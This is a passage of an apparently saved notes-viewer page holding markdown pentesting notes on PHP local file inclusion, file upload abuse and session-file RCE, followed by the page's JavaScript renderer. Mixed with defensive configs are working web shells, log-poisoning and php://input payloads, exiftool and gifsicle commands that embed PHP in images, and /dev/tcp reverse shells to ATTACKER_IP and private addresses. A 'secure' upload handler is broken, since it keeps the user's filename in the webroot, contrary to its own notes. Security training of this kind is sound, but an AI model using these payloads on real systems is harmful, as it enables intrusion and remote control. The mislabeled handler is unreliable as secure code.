Executing code via php://input\n?page=php://input\nPOST: <?php system($_GET['cmd']); ?>\n```\n\n---\n\n#### 2. 💉 Null Byte Injection\n\n- Appending a null byte (`%00`) to file names can bypass filters restricting file extensions\n- For example, a filter blocking `.png` files can be bypassed by requesting `file.php%00.jpg`, thus including `file.php`\n- This technique exploits how PHP treats the null byte as string termination in certain versions/situations\n\n**Example:**\n\n```php\n// Bypassing extension filter\n?page=malicious.php%00.jpg\n// PHP interprets this as malicious.php\n```\n\n---\n\n#### 3. 📤 File Upload Abuse\n\n- When combined with an upload functionality, attackers upload files that appear legitimate (e.g., images) but contain embedded PHP payloads\n- A common method is appending PHP code as a comment within an image file\n- After uploading, the attacker uses the LFI vulnerability to include and execute the uploaded file\n\n**Attack Flow:**\n\n1. Upload image with embedded PHP payload\n2. Use LFI to include the uploaded file\n3. Execute malicious code\n\n---\n\n#### 4. 📝 Controlled Log / Log Poisoning\n\n- Attackers inject PHP code into log files (e.g., HTTP headers like `User-Agent`)\n- If logs are accessible via LFI, including the log file leads to executing attacker-controlled PHP code\n- This method leverages writable logs and improper file inclusion paths\n\n**Example:**\n\n```bash\n# Inject PHP code in User-Agent\ncurl -A \"<?php system('whoami'); ?>\" http://target.com/\n\n# Include the log file via LFI\n?page=/var/log/apache2/access.log\n```\n\n---\n\n## 🚨 File Upload Abuse {#file-upload-abuse}\n\n> **Scope:** This document explains how file upload abuse works, common exploitation techniques, defensive controls, safe code/config samples, testing guidance, detection & response, and quick takeaways you can copy into Slack or a poster.\n\n### What is File Upload Abuse?\n\nFile Upload Abuse occurs when an attacker leverages an application's file upload functionality to store or execute malicious content on the server or impact other users. Risks include:\n\n- Remote code execution (RCE)\n- Stored XSS\n- Phishing distribution\n- Data exfiltration\n- Privilege escalation\n- Supply-chain contamination of user-facing content\n\n---\n\n### 🔄 How it Typically Works (Brief Flow)\n\n1. **Attacker finds an upload endpoint** (public or authenticated)\n2. **Attacker uploads a crafted file** that bypasses naive checks (extension, Content-Type)\n3. **Server stores the file** in a web-accessible location or processes it with unsafe parsers\n4. **Attacker triggers the file** (visits URL, includes it in an app flow) and achieves impact (RCE, XSS, phishing, etc.)\n\n---\n\n### 🛠️ Common Exploitation Techniques\n\n#### **Double Extensions**\n\nAdding `.php` into a filename (e.g., `avatar.jpg.php`) when only the last extension isn't validated\n\n**Example:**\n\n```\navatar.jpg.php  → Executes as PHP if not properly validated\n```\n\n---\n\n#### **Null Byte Injection**\n\nUsing `%00` terminated names (rare on modern stacks but historically relevant)\n\n**Example:**\n\n```\nmalicious.php%00.jpg  → Interpreted as .php\n```\n\n---\n\n#### **Content-Type Spoofing**\n\nSending `Content-Type: image/jpeg` while the body contains script\n\n**Example:**\n\n```http\nContent-Type: image/jpeg\n[PHP script content]\n```\n\n---\n\n#### **Polyglot Files**\n\nFiles valid as both an image and scripting language (e.g., PHP in an image comment)\n\n**Example:**\n\n```php\nGIF89a<?php system($_GET['cmd']); ?>\n```\n\n---\n\n#### **ZIP/Archive Polyglots**\n\nDeploy a web shell inside an archive that gets unpacked by server-side utilities\n\n---\n\n#### **Magic-Byte Bypass**\n\nCrafting file contents to match a simple magic-byte check while containing payload elsewhere (Exif, comments, extra segments)\n\n---\n\n#### **Path Traversal in Filename**\n\nUsing `../../../` sequences in filename or metadata to write outside intended directory\n\n**Example:**\n\n```\n../../../var/www/html/shell.php\n```\n\n---\n\n> **Note:** Modern frameworks and runtimes have mostly mitigated classic null-byte attacks, but other bypasses remain common.\n\n---\n\n## 🎭 Real-World Abuse Scenarios (High Level) {#real-world-scenarios}\n\n### 1. **Web Shell Upload**\n\nUploading a **web shell** into an uploads directory that the web server executes. Attackers may then pivot and extract credentials or run arbitrary commands.\n\n---\n\n### 2. **XSS/Phishing Pages**\n\nUploading HTML/SVG/JS to host phishing pages or deliver XSS to other users.\n\n---\n\n### 3. **Malware Distribution**\n\nUploading malware or hosting malicious files that users download.\n\n---\n\n### 4. **Denial of Service**\n\nStoring large or malformed files to cause denial-of-service or crash parsers (e.g., zip bombs).\n\n---\n\n## 🛡️ Defensive Strategy — Layered Approach {#defensive-strategy}\n\n### 1️⃣ Input Validation & Allow-Listing\n\n- **Only accept the minimum file types** your application needs (e.g., `jpg`, `png`, `pdf`)\n- **Validate on server-side** — never trust client-side checks\n\n**Best Practice:**\n\n```php\n$allowed = array('png', 'jpg', 'gif');\n```\n\n---\n\n### 2️⃣ Content Verification\n\n#### **Check File Magic Bytes**\n\nFile signatures using a maintained DB (libmagic / python-magic)\n\n```bash\nfile --mime-type suspicious-file.png\n```\n\n#### **For Images**\n\nValidate actual image decoding (load with image library and confirm dimensions and expected metadata)\n\n```php\n$imagedetails = getimagesize($_FILES['file']['tmp_name']);\n```\n\n#### **For Archives**\n\nInspect contents; don't auto-extract untrusted archives\n\n---\n\n### 3️⃣ Storage Hardening\n\n#### **Rename Files**\n\nRandomized IDs (UUIDs or cryptographic random hex) and strip user-supplied names\n\n```php\n$newFilename = bin2hex(random_bytes(16)) . '.' . $fileExt;\n```\n\n#### **Store Outside Webroot**\n\nStore uploads **outside** the webroot when possible. Serve files through an application proxy or signed URLs.\n\n```bash\n# Store in /var/www/uploads (outside webroot)\nmkdir -p /var/www/uploads\n```\n\n#### **Ensure No Script Execution**\n\nEnsure uploaded-directory has **no script execution** enabled\n\n---\n\n### 4️⃣ Server & Webserver Config\n\n#### **Return 403 for Script Files**\n\nConfigure your webserver to return 403 for script files in upload directories\n\n**Nginx Example:**\n\n```nginx\nlocation /uploads/ {\n    alias /var/www/uploads/;\n    internal;\n    autoindex off;\n    try_files $uri =404;\n}\n```\n\n**Apache Example:**\n\n```apache\n<FilesMatch \"\\.(php|phtml|php5|pl|py|jsp|asp)$\">\n    Require all denied\n</FilesMatch>\n```\n\n#### **Correct MIME/Handler Mappings**\n\nAvoid interpreting uploaded files by ensuring MIME/handler mappings conservatively\n\n---\n\n### 5️⃣ Scanning & Sandboxing\n\n- **Scan with antivirus** (ClamAV, VirusTotal API) before making files accessible\n- **Sandbox execution** for advanced analysis\n- **Use background jobs** or object-created hooks (S3 Lambda) for async scanning\n\n---\n\n## 🐘 Secure PHP Upload Handler (save this as `file-upload.php` in webroot) {#secure-php-handler}\n\n> **Note:** This script stores files outside the webroot (`/var/www/uploads`) and returns a signed (or application-proxied) access URL. Adjust `MAX_FILE_SIZE` and `$ALLOWED_EXT` to your needs.\n\n```php\n<?php\n\n// Check if the upload form was submitted\nif (isset($_POST['upload'])) {\n\n    // Allowed file extensions\n    $allowed = array('png', 'jpg', 'gif');\n\n    // Allowed MIME types\n    $allowed_mime = array('image/png', 'image/jpeg', 'image/gif');\n\n    // Detect the MIME type of the uploaded file\n    $fileMime = mime_content_type($_FILES['file']['tmp_name']);\n\n    // Get the file extension of the uploaded file\n    $filename = explode(\".\", $_FILES['file']['name']);\n    $fileExt = end($filename);\n\n    // Split filename to extract extension\n    $splitFilename = explode(\".\", $_FILES['file']['name']);\n    $fileExtension = end($splitFilename);\n\n    // Detect image details (returns false if not an image)\n    $imagedetails = getimagesize($_FILES['file']['tmp_name']);\n\n    // Get the file extension (last part after the dot)\n    $fileExtension = end($splitFilename);\n\n    // Check for any file upload error\n    if ($_FILES['file']['error']) {\n        echo \"Please upload a PNG / JPG / GIF\";\n        die(); // Stop script execution\n    } else {\n\n        // Validation:\n        // 1. Extension must be in $allowed\n        // 2. getimagesize() must confirm it's an image\n        // 3. MIME type must be in $allowed_mime\n        if (in_array($fileExtension, $allowed) && ($imagedetails == true) && in_array($fileMime, $allowed_mime)) {\n\n            // Print file details\n            echo \"Name: \" . $_FILES[\"file\"][\"name\"] . \"<br />\";\n            echo \"Size: \" . $_FILES[\"file\"][\"size\"] . \"<br />\";\n            echo \"Temp File: \" . $_FILES[\"file\"][\"tmp_name\"] . \"<br />\";\n\n            // Move file to the \"upload\" directory\n            move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], \"upload/\" . $_FILES[\"file\"][\"name\"]);\n\n            echo \"File Uploaded Successfully\";\n\n        } else {\n            // If file doesn't meet the whitelist rules\n            echo \"<br />Please upload a PNG / JPG / GIF\";\n        }\n    }\n}\n\n?>\n\n<!DOCTYPE html>\n<html>\n<head>\n    <meta charset=\"utf-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n    <title>File Upload - Whitelist</title>\n</head>\n<body>\n```\n\n---\n\n## ⚙️ Server Configuration {#server-configuration}\n\n### 🐧 Linux Commands — Create Upload Area & Permissions\n\n**Recommended:** Store uploads **outside** the webroot, e.g. `/var/www/uploads` or `/srv/uploads`. If you must use a webroot subdirectory, still disable script execution there.\n\n#### Create the Upload Directory (Outside Webroot)\n\n```bash\nmkdir -p /var/www/html/web-pentest/uploads\n```\n\n#### Set Ownership to Webserver User\n\n```bash\nchown www-data:www-data /var/www/html/web-pentest/uploads\n```\n\n#### Restrict Permissions\n\n```bash\nchmod 755 /var/www/html/web-pentest/uploads\n```\n\n---\n\n### 🌐 Webserver: Disable Script Execution in Upload Directory\n\n#### **Nginx (Recommended: Serve via Application or Signed URLs)**\n\nPlace this in your server config (not the `location` that executes PHP):\n\n```nginx\n# ensure uploaded files cannot be interpreted as scripts\nlocation /uploads/ {\n    alias /var/www/uploads/;\n    internal;           # optional: force serving through backend if used\n    autoindex off;\n    try_files $uri =404;\n}\n```\n\nIf you use `internal` in `location /uploads/`, you must provide an application endpoint that reads the file and returns it (signed URLs recommended).\n\n---\n\n#### **Apache (Example `.htaccess` or Site Config)**\n\nCreate an `.htaccess` in the upload folder (if `AllowOverride` enabled) or add to the site config:\n\n```apache\n# disable script handling\n<FilesMatch \"\\.(php|phtml|php5|pl|py|jsp|asp)$\">\n    Require all denied\n</FilesMatch>\n\n# avoid content sniffing and force download if needed\nHeader set X-Content-Type-Options \"nosniff\"\n```\n\n---\n\n## ✅ Testing & Safe Operational Checklist {#testing-operations}\n\n### **Test Only on Staging Environments You Control**\n\nDo not upload malware to production.\n\n### **Verify:**\n\n- **Upload directory is not executable**\n    \n    ```bash\n    find /var/www/uploads -type f -exec file {} \\; optionally\n    ```\n    \n- **Webserver does not process `.php`, `.phtml`, etc.** Test by uploading a benign PHP file and confirming it doesn't execute\n    \n- **Filenames cannot be manipulated** Already randomized in secure handler\n    \n\n---\n\n### **Monitor Logs For:**\n\n- **Uploads with mismatched `Content-Type` vs `finfo`**\n- **Repeated small upload/download files**\n- **Attempted requests for `.php`, `.phtml` or other blocked extensions in upload path**\n\n---\n\n## 🔒 Notes on the Script\n\n- **Files are stored outside the webroot** (`/var/www/html/web-pentest/uploads`) — prevents direct execution\n- **Filename is randomized** to avoid user-controlled names and path traversal\n- **Uses `finfo` (libmagic) and `getimagesize()`** to verify content\n- **Enforces maximum file size; sets secure file permissions**\n- **Recommends scanning (AV) and recording upload metadata** (user, IP, sha256) in a DB\n\n---\n\n## 🔍 Optional: Quick AV Scan with ClamAV (Example)\n\n### Scan a Recently Uploaded File\n\n```bash\nclamscan --no-summary /var/www/html/web-pentest/uploads/<file>\n```\n\n### For Better Performance (with clamd daemon)\n\n```bash\nclamdscan /var/www/uploads/<file>\n```\n\n> Integrate scanning via background job or object-created hook (S3 Lambda).\n\n---\n\n## 🛡️ Serving Uploaded Files Securely\n\n### **Preferred:**\n\nServe through an application endpoint that verifies authorization and returns file bytes. That endpoint should read from `/var/www/uploads/<file>` and set correct headers (`Content-Type`, `Content-Disposition`) and the `X-Content-Type-Options: nosniff` header.\n\n### **Alternate:**\n\nUse temporary pre-signed URLs (S3) — objects should remain private until scanned and validated.\n\n### Example Response Header Suggestions:\n\n```http\nContent-Type: image/jpeg\nContent-Disposition: inline; filename=\"image.jpg\"\nX-Content-Type-Options: nosniff\nCache-Control: private, max-age=3600\n```\n\n---\n\n## 📊 File Upload Abuse — Threat Summary, Detection & Mitigation\n\n> **⚠️ Warning:** The techniques summarized below are offensive in nature (embedding executable code in image files to bypass naive upload filters). This document **does not** provide instructions to create exploits. It focuses on how defenders can detect, remove, and prevent such abuse.\n\nAttackers sometimes hide executable code inside image files (metadata, comments, or concatenated payloads) to bypass extension checks and achieve remote code execution when a vulnerable server interprets the file as code. Common goals include running commands, dumping server info, or planting backdoors.\n\n---\n\n## 🎯 Threat Techniques (High-Level)\n\n### **Disguised Filenames**\n\nAdding `.php` into a filename (e.g., `image.php.png`) to trick naive extension checks\n\n### **Embedded Metadata Payloads**\n\nPlacing scripting code inside EXIF/XMP/comment fields of images\n\n### **Comment-Embedded Payloads**\n\nUsing image-comment features (GIF comments, PNG text chunks) to hide code\n\n### **Polyglots / Concatenation**\n\nJoining a valid image with a script so initial bytes look like an image while later bytes contain code\n\n### **Magic-Byte / Header-Only Checks**\n\nBypassing checks that only inspect the file header without decoding the full content\n\n---\n\n## 🔧 Defensive Detection (Commands & Checks)\n\nUse these defensive commands to inspect files you control or to include in an ingestion pipeline. **Run only on systems and files you are authorized to analyze.**\n\n### Inspect Metadata and Comments\n\n```bash\n# Install exiftool\napt install exiftool\n\n# Show EXIF/XMP metadata (defensive)\nexiftool suspicious-file.png\n```\n\n---\n\n### Search for Embedded PHP or Other Script Markers\n\n```bash\n# Show printable strings and search for PHP markers (defensive)\nstrings suspicious-file.png | grep -i '<?php' -n || true\n```\n\n---\n\n### Inject PHP Code into Image Comment with exiftool\n\n**⚠️ OFFENSIVE EXAMPLE (for education only):**\n\n```bash\nexiftool -Comment='<?php echo \"<pre>\"; system($_GET['cmd']); ?>' w.php.png\n```\n\n---\n\n### Install and Use gifsicleest\n\n```bash\napt install gifsicle\n```\n\n---\n\n### Search for Embedded PHP in Files\n\n```bash\n# Show printable strings and search for PHP markers (defensive)\nstrings Sample-GIF.gif | grep -i '<?php' -n || true\n```\n\n---\n\n### Inject PHP into GIF Comment with gifsicle\n\n**⚠️ OFFENSIVE EXAMPLE (for education only):**\n\n```bash\ngifsicle < 1.gif --comment \"<?php phpinfo(); ?>\" > phpinfo.gif\n```\n\n---\n\n### Check MIME Type Using libmagic\n\n```bash\n# Determine detected MIME type\nfile --mime-type Sample-GIF.gif\n\n# Or (more reliable)\npython -m mimetypes Sample-GIF.gif\n```\n\n---\n\n### Inspect Image Internals with ImageMagick (Defensive)\n\n```bash\nidentify -verbose suspicious-file.png | less\n```\n\n---\n\n### Find Suspicious Filenames on Disk (Defensive)\n\n```bash\n# Files containing \"php\" in the name under uploads\nfind /var/www/uploads -type f -iname '*php*' -print\n```\n\n---\n\n### Scan Newly Uploaded Files with AV (Defensive)\n\n```bash\nclamscan --no-summary /var/www/uploads/newfile\n\n# Or use clamdscan for daemonized scanning\nclamdscan /var/www/uploads/newfile\n```\n\n---\n\n## 🧹 Removal / Neutralization (Safe Commands)\n\nIf you find files that contain suspicious metadata/comments, remove metadata and re-encode images to strip hidden fields. **These commands do not add payloads; they remove metadata and re-encode images.**\n\n### Remove All Metadata with exiftool\n\n```bash\n# Remove all metadata with exiftool (creates a backup by default)\nexiftool -all= suspicious-file.png\n```\n\n---\n\n## 🔄 Embedding a PHP Reverse Shell Payload in GIF Comment\n\n> **Educational Purpose Only** - This demonstrates how attackers embed payloads\n\nSuppose the PHP reverse shell payload is saved in a file named `php-reverse-shell.php`. You can embed this entire payload as the GIF comment by passing it inline or reading it from the file.\n\n### Updated Command:\n\nIf you want to embed an inline PHP reverse shell payload directly (example payload):\n\n```bash\ngifsicle < Sample-GIF.gif --comment \"<?php exec('/bin/bash -c \\'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1\\''); ?>\" > rshell.gif\n```\n\nReplace `ATTACKER_IP` and `PORT` with your attacker's IP and desired listening port.\n\n### Example Command Used:\n\n```bash\ngifsicle < Sample-GIF.gif --comment \"<?php exec('/bin/bash -c \\'bash -i >& /dev/tcp/192.168.1.7/0 0>&1\\''); ?>\" > rshell.gif\n```\n\n---\n\n### Or Embed from a Separate File (More Practical):\n\n```bash\ngifsicle < 1.gif --comment \"$(cat php-reverse-shell.php)\" > rshell.gif\n```\n\nThis reads the entire content of your `php-reverse-shell.php` and injects it as the GIF comment.\n\n---\n\n## 📌 Notes:\n\n- The reverse shell PHP code typically looks like this minimal example:\n\n```php\n<?php\nexec(\"/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'\");\n?>\n```\n\n- The uploaded GIF will still be a valid image but includes the PHP code in the comment, which may execute if the file is included via LFI or accessed as a PHP script on the server.\n\n---\n\n## 📝 Quick Slack-Ready Summary (Copy/Paste)\n\n> **Secure Uploads — Checklist:** Store uploads outside webroot, allow-list extensions, validate magic bytes with `finfo`, verify via `getimagesize()` for images, randomize filenames, set tight perms, disable script execution in upload directory, scan with AV, and serve files via app-proxy or signed URLs.\n\n---\n\n## 🎯 Key Takeaways\n\n✅ **Store files outside webroot** to prevent direct access  \n✅ **Validate file types** using magic bytes (libmagic/finfo) and `getimagesize()` for images  \n✅ **Randomize filenames** to prevent path traversal attacks  \n✅ **Set restrictive permissions** (755 for directories, 644 for files)  \n✅ **Disable script execution** in upload directories via web server configuration  \n✅ **Scan files with antivirus** (ClamAV recommended)  \n✅ **Serve files securely** through application endpoints with proper headers or pre-signed URLs  \n✅ **Monitor logs** for suspicious upload patterns  \n✅ **Never trust client-side validation** — always validate server-side\n\n---\n\n_Last Updated: January 6, 2026_  \n_Document Version: 2.0_"}, {"name": "rce through session id", "content": "  \n13:58\n\n# 🔐 PHP Sessions and Local File Inclusion (LFI) Attack\n\n## 📋 Table of Contents\n\n- [PHP Session Storage](https://claude.ai/chat/ef443c35-a06e-4a17-89ff-55ed167b4f36#php-session-storage)\n- [Vulnerability: Local File Inclusion (LFI) via Session Files](https://claude.ai/chat/ef443c35-a06e-4a17-89ff-55ed167b4f36#vulnerability-local-file-inclusion-lfi-via-session-files)\n- [Example Vulnerable PHP Script](https://claude.ai/chat/ef443c35-a06e-4a17-89ff-55ed167b4f36#example-vulnerable-php-script-lfi-phpsessionphp)\n- [Example PHP Payloads](https://claude.ai/chat/ef443c35-a06e-4a17-89ff-55ed167b4f36#example-php-payloads-potentially-stored-in-sessions)\n- [Another Session Handling Example](https://claude.ai/chat/ef443c35-a06e-4a17-89ff-55ed167b4f36#another-session-handling-example-lfi-phpsession2php)\n\n---\n\n## 📁 PHP Session Storage\n\nWhen a website uses PHP sessions (with PHPSESSID), session data is typically stored on the server filesystem in paths such as:\n\nbash\n\n````bash\n/var/lib/php/sessions/sess_[PHPSESSID]\n/var/lib/php5/sess_[PHPSESSID]\n/var/lib/php/sess_[PHPSESSID]\n```\n\n> **Note:** The files contain serialized session data corresponding to the PHPSESSID cookie.\n\n---\n\n## 🚨 Vulnerability: Local File Inclusion (LFI) via Session Files\n\nIf an application exposes a Local File Inclusion (LFI) vulnerability, it may allow an attacker to include and read session files by specifying the session file path, for example:\n```\nhttp://192.168.1.45/webpentest/local-file-inclusion.php?file=/var/lib/php/sessions/sess_vhcq3jkuh2odqbl73kpfro9bhh\n````\n\n> ⚠️ **Warning:** This can lead to sensitive information disclosure or code execution if session files contain executable PHP code.\n\n---\n\n## 📝 Example Vulnerable PHP Script: `lfi-phpsession.php`\n\n### File Location\n\nbash\n\n```bash\nvim lfi-phpsession.php\n```\n\n### Code\n\nphp\n\n```php\n<?php\nif (isset($_POST['submit'])) {\n    $username = $_POST['username'];\n    $password = $_POST['password'];\n    session_start();\n    $_SESSION['username'] = $username;\n}\n?>\n<!DOCTYPE html>\n\n<html>\n<head>\n    <meta charset=\"utf-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n    <title>PHP Session</title>\n</head>\n<body>\n    <form action=\"lfi-phpsession.php\" method=\"POST\">\n        Username: <input type=\"text\" name=\"username\" value=\"\" /> <br />\n        Password: <input type=\"password\" name=\"password\" value=\"\" /> <br />\n        <input type=\"submit\" name=\"submit\" value=\"login\" />\n    </form>\n</body>\n</html>\n```\n\n---\n\n## 💉 Example PHP Payloads Potentially Stored in Sessions\n\nThese are sample PHP payloads an attacker might try to inject and execute if session files are included:\n\n### 1. Reverse Shell via /bin/bash\n\nphp\n\n```php\n<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.77/443 0>&1'\"); ?>\n```\n\n### 2. Reverse Shell via system()\n\nphp\n\n```php\n<?php system('bash -i >& /dev/tcp/192.168.1.6/443 0>&1'); ?>\n```\n\n### 3. Command Execution via $_GET\n\nphp\n\n```php\n<?php echo system($_GET['cmd']); ?>\n```\n\n### 4. Direct Reverse Shell\n\nphp\n\n```php\n<?php /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.6/443 0>&1' ?>\n```\n\n---\n\n## 🔄 Another Session Handling Example: `lfi-phpsession2.php`\n\n### File Location\n\nbash\n\n```bash\nvim lfi-phpsession2.php\n```\n\n### Code\n\nphp\n\n```php\n<?php\n    if (isset($_POST['submit'])) {\n        \n        $username = $_POST['username'];\n        \n        $password = $_POST['password'];\n        \n        if ($username == \"admin\" && $password == \"@rmour123\") {\n            \n            session_start();\n            \n            $cookie_name = \"user\";\n            \n            $cookie_value = \"admin\";\n            \n            $cookie_expire = time()+(60*60*24*7);\n            \n            setcookie($cookie_name, $cookie_value, $cookie_expire);\n            \n            $_SESSION['user'] = $_COOKIE['user'];\n            \n        }\n        \n    }\n\n?>\n\n<!DOCTYPE html>\n<html>\n<head>\n    <meta charset=\"utf-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n    <title>PHP Session</title>\n</head>\n<body>\n    \n    <form action=\"lfi-phpsession2.php\" method=\"POST\">\n        \n        Username: <input type=\"text\" name=\"username\" value=\"\" /> <br />\n        Password: <input type=\"password\" name=\"password\" value=\"\" /> <br />\n        <input type=\"submit\" name=\"submit\" value=\"login\" />\n        \n    </form>\n\n</body>\n</html>\n```\n\n### Key Features:\n\n- ✅ Hardcoded credentials: `admin` / `@rmour123`\n- 🍪 Sets cookie named \"user\" with value \"admin\"\n- ⏱️ Cookie expiration: 7 days\n- 💾 Stores user data in session: `$_SESSION['user']`\n\n---\n\n## 🎯 Attack Summary\n\n|Step|Description|\n|---|---|\n|1️⃣|Find LFI vulnerability in target application|\n|2️⃣|Inject malicious PHP code via user input (username, etc.)|\n|3️⃣|Code gets stored in session file|\n|4️⃣|Use LFI to include session file path|\n|5️⃣|Malicious PHP code executes → Remote Code Execution|\n\n## 🛡️ Mitigation Recommendations\n\n- ✔️ **Validate and sanitize** all user inputs\n- ✔️ **Use whitelisting** for file inclusion paths\n- ✔️ **Disable** `allow_url_include` in php.ini\n- ✔️ **Store sessions** in database instead of filesystem\n- ✔️ **Implement proper** access controls\n- ✔️ **Regular security** audits and penetration testing\n\n---\n\n## 📚 References\n\n- [OWASP LFI](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion)\n- [PHP Session Security](https://www.php.net/manual/en/session.security.php)\n- [File Inclusion Vulnerabilities](https://portswigger.net/web-security/file-path-traversal)\n\n\n\n# 🔐 Web Application Security Testing Documentation\n\n## Overview\n\nThis document showcases PHP session management vulnerabilities, theme implementation, and Local File Inclusion (LFI) exploitation techniques discovered during web application penetration testing.\n\n---\n\n## 📋 Table of Contents\n\n1. [Complete PHP Session Code](https://claude.ai/chat/58f0e74d-cb87-40f7-ab30-c0aa1e703556#complete-php-session-code)\n2. [Code Analysis & Breakdown](https://claude.ai/chat/58f0e74d-cb87-40f7-ab30-c0aa1e703556#code-analysis--breakdown)\n3. [LFI Attack Vectors](https://claude.ai/chat/58f0e74d-cb87-40f7-ab30-c0aa1e703556#lfi-attack-vectors)\n4. [Security Considerations](https://claude.ai/chat/58f0e74d-cb87-40f7-ab30-c0aa1e703556#security-considerations)\n\n---\n\n## 💻 Complete PHP Session Code\n\n### **File: `lfi-phpsession2.php`**\n\n```php\n<?php\n// Start session before any output\nsession_start();\n\n// Default theme fallback\n$theme = 'light';\n\n// Handle form submit\nif (isset($_POST['submit'])) {\n    $username = $_POST['username'] ?? '';\n    $password = $_POST['passwd'] ?? '';\n    $selectedTheme = $_POST['theme'] ?? 'light';\n    \n    // Simple credential check (keep as-is or replace with proper auth)\n    if ($username === \"admin\" && $password === \"@rmour123\") {\n        // Set user cookie (7 days)\n        $cookie_expire = time() + (60 * 60 * 24 * 7);\n        setcookie('user', $username, $cookie_expire, '/');\n        \n        // Set theme cookie (7 days)\n        setcookie('theme', $selectedTheme, $cookie_expire, '/');\n        \n        // Also set session values so you can use them immediately\n        $_SESSION['user'] = $username;\n        $_SESSION['theme'] = $selectedTheme;\n        \n        // Redirect to same page so cookies are available in $_COOKIE on next request\n        header('Location: ' . $_SERVER['PHP_SELF']);\n        exit;\n    } else {\n        $login_error = \"Invalid username or password.\";\n    }\n}\n\n// Decide theme to apply now (priority: session -> cookie -> default)\nif (isset($_SESSION['theme'])) {\n    $theme = $_SESSION['theme'];\n} elseif (isset($_COOKIE['theme'])) {\n    $theme = $_COOKIE['theme'];\n}\n?>\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"utf-8\" />\n    <meta name=\"viewport\" content=\"width=device-width,initial-scale=1\" />\n    <title>PHP Session & Theme</title>\n    <style>\n        /* Very simple example theme styling */\n        body.light { background: #fff; color: #111; }\n        body.dark { background: #121212; color: #eee; }\n        .container { \n            max-width: 480px; \n            margin: 2rem auto; \n            padding: 1rem; \n            border-radius: 8px; \n        }\n        .card { \n            padding: 1rem; \n            border-radius: 6px; \n            background: rgba(0,0,0,0.05); \n        }\n    </style>\n</head>\n<body class=\"<?= htmlspecialchars($theme) ?>\">\n    <div class=\"container\">\n        <h1>Login (theme stored in cookie)</h1>\n        \n        <?php if (!empty($login_error)): ?>\n            <div style=\"color: #c00;\"><?= htmlspecialchars($login_error) ?></div>\n        <?php endif; ?>\n        \n        <?php if (!empty($_SESSION['user'])): ?>\n            <div class=\"card\">\n                <p>Welcome, <strong><?= htmlspecialchars($_SESSION['user']) ?></strong>!</p>\n                <p>Current theme: <strong><?= htmlspecialchars($theme) ?></strong></p>\n                <form method=\"post\" action=\"<?= htmlspecialchars($_SERVER['PHP_SELF']) ?>\">\n                    <label>\n                        Change theme:\n                        <select name=\"theme\">\n                            <option value=\"light\" <?= $theme === 'light' ? 'selected' : '' ?>>Light</option>\n                            <option value=\"dark\" <?= $theme === 'dark' ? 'selected' : '' ?>>Dark</option>\n                        </select>\n                    </label>\n                    <button type=\"submit\" name=\"submit\" value=\"updateTheme\">Update theme</button>\n function buildSidebar(filter) {
  const list = document.getElementById('fileList');
  list.innerHTML = '';
  let count = 0;
  NOTES.forEach(function(note, i) {
    if (filter && note.name.toLowerCase().indexOf(filter.toLowerCase()) === -1) return;
    var div = document.createElement('div');
    div.className = 'file-item';
    div.id = 'fi-' + i;
    var icon = document.createElement('span');
    icon.className = 'fi-icon';
    icon.textContent = '▸';
    var name = document.createElement('span');
    name.className = 'fi-name';
    name.textContent = note.name;
    div.appendChild(icon);
    div.appendChild(name);
    div.addEventListener('click', (function(idx){ return function(){ openNote(idx); }; })(i));
    list.appendChild(div);
    count++;
  });
  document.getElementById('visCount').textContent = count;
}

function esc(str) {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

function renderMd(raw) {
  // Step 1: Split into code blocks and text blocks
  // Code blocks are rendered as-is (escaped), text blocks get markdown treatment
  var parts = raw.split(/(```[\s\S]*?```|`[^`
]+`)/g);
  var result = '';
  
  for (var i = 0; i < parts.length; i++) {
    var part = parts[i];
    if (part.startsWith('```')) {
      // Fenced code block - just escape, no markdown
      var code = part.replace(/^```\w*
?/, '').replace(/```$/, '').trim();
      result += '<pre><code>' + esc(code) + '</code></pre>';
    } else if (part.startsWith('`') && part.endsWith('`')) {
      // Inline code
      result += '<code>' + esc(part.slice(1, -1)) + '</code>';
    } else {
      // Regular text - escape first, then apply markdown
      var t = esc(part);
      t = t.replace(/^#### (.+)$/gm, '<h4>$1</h4>');
      t = t.replace(/^### (.+)$/gm, '<h3>$1</h3>');
      t = t.replace(/^## (.+)$/gm, '<h2>$1</h2>');
      t = t.replace(/^# (.+)$/gm, '<h1>$1</h1>');
      t = t.replace(/\*\*\*(.+?)\*\*\*/g, '<strong><em>$1</em></strong>');
      t = t.replace(/\*\*(.+?)\*\*/g, '<strong>$1</strong>');
      t = t.replace(/\*(.+?)\*/g, '<em>$1</em>');
      t = t.replace(/^---+$/gm, '<hr>');
      t = t.replace(/^&gt; (.+)$/gm, '<blockquote>$1</blockquote>');
      t = t.replace(/^[\*\-] (.+)$/gm, '<li>$1</li>');
      t = t.replace(/^\d+\. (.+)$/gm, '<li>$1</li>');
      t = t.replace(/(<li>[\s\S]+?<\/li>)/g, function(m){ return '<ul>' + m + '</ul>'; });
      t = t.replace(/<\/ul>\s*<ul>/g, '');
      t = t.replace(/\[([^\]]+)\]\(([^)]+)\)/g, '<a href="$2" target="_blank" rel="noopener noreferrer">$1</a>');
      t = t.replace(/

+/g, '</p><p>');
      t = t.replace(/
/g, '<br>');
      result += '<p>' + t + '</p>';
    }
  }
  return result;
}

function openNote(idx) {
  document.querySelectorAll('.file-item').forEach(function(e){ e.classList.remove('active'); });
  var el = document.getElementById('fi-' + idx);
  if (el) { el.classList.add('active'); el.scrollIntoView({block: 'nearest'}); }
  document.getElementById('vPath').textContent = 'LFI & RFI/' + NOTES[idx].name;
  var viewer = document.getElementById('viewerContent');
  viewer.innerHTML = renderMd(NOTES[idx].content);
  viewer.scrollTop = 0;
}

// Init on load
buildSidebar();
if (NOTES.length > 0) openNote(0);
